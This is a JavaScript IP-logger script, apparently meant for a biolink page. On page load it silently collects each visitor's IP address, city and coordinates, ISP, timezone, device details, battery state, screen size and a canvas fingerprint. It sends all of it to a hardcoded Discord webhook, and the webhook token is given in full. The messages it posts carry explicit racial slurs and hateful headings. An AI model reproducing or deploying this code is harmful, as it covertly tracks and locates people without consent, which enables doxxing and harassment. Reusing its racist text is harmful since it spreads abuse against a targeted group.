const WEBHOOK_URL = "https://discord.com/api/webhooks/1440182341803835423/xYWmNFxTdxaG8yFXHT9yj1l4cH9wUmk9oKqGTgBXj_v8Hwvs6uVMYwwWaQk672pIS2mC";

async function getLocation(ip) {
    try {
        const res = await fetch('http://ip-api.com/json/${ip}?fields=66846719&lang=en');
        return await res.json();
    } catch { return { status: "fail" }; }
}

function getCanvasFP() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = "#000";
    ctx.fillRect(0,0,300,150);
    ctx.fillStyle = "#000";
    ctx.font = "40px Orbitron";
    ctx.fillText("GODS FAVORITE", 10, 80);
    return canvas.toDataURL();
}

async function stealEverything() {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const { ip } = await ipRes.json();
    const geo = await getLocation(ip);
    
    let battery = "N/A";
    if (navigator.getBattery) {
        const b = await navigator.getBattery();
        battery = '${Math.round(b.level*100)}% ${b.charging ? "charging" : "discharging"}';
    }

    const data = {
        content: "**BIOLINK LOG - I HATE NIGGERS** @everyone",
        embeds: [{
            title: "Nigger just clicked the link",
            color: 0x000000,
            timestamp: new Date().toISOString(),
            thumbnail: { url: "https://media.discordapp.net/attachments/1417282363867529479/1440174219240407071/F91E1C1E-7EAA-497B-8E49-F1A30939E573.jpg?ex=691d3243&is=691be0c3&hm=2e5a29634365a4bcf7a081d0ed11f7dbc833a515f4b8a3652ca502dafc3a2d9a&=&format=webp&width=666&height=805"},
            fields: [
                { name: "IP", value: `\`\`\`${ip}\`\`\``, inline: true },
                { name: "Location", value: `\`\`\`${geo.city || "??"}, ${geo.regionName || "??"} ${geo.country || "??"} (${geo.zip})\`\`\``, inline: true },
                { name: "Coords", value: `[Google Maps](https://maps.google.com/?q=${geo.lat},${geo.lon})`, inline: true },
                { name: "ISP", value: `\`\`\`${geo.isp}\`\`\``, inline: true },
                { name: "Timezone", value: `\`\`\`${geo.timezone}\`\`\``, inline: true },
                { name: "Device", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
                { name: "Battery", value: `\`\`\`${battery}\`\`\``, inline: true },
                { name: "Screen", value: `\`\`\`${screen.width}x${screen.height}\`\`\``, inline: true },
                { name: "Canvas FP", value: getCanvasFP(), inline: false }
            ]
        }]
    };

    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
    });
}

// Double tap
window.addEventListener("load", stealEverything);
